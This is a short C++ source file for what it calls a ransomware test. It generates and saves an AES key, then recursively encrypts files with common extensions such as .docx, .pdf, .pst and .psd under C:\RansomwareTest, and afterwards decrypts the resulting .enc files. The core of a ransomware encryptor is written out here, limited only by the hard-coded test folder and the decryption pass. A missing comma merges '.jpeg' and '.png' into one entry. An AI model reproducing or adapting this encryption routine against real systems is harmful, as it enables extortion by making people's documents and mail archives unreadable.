#include <iostream>
#include <array>
#include <fstream>

#include "Crypto.h"
#include "FileWalker.h"


int main()
{
	CryptoPP::AutoSeededRandomPool rng;
	AESKey filemasterkey = generateKey(rng);
	save_key(filemasterkey);

	FileWalker fileWalker("C:\\RansomwareTest", [&filemasterkey, &rng](const std::string& filename) {
		std::cout << filename << "\n";
		encrypt_file(filename, filemasterkey, rng);
	});
	fileWalker.addExtensions({
		".jpg",
		".jpeg"
		".png",
		".docx",
		".doc",
		".xslx",
		".xls",
		".ppt",
		".pptx",
		".pst",
		".ost",
		".blend",
		".3ds",
		".psd",
		".pdf",
		".svg",
		".accdb"
	});
	fileWalker.start();

	FileWalker decryptionWalker("C:\\RansomwareTest", [&filemasterkey, &rng](const std::string& filename) {
		std::cout << "Decrypting file " << filename << "\n";
		decrypt_file(filename, filemasterkey);
	});
	decryptionWalker.addExtension(".enc");
	decryptionWalker.start();

	std::cin.get();
}



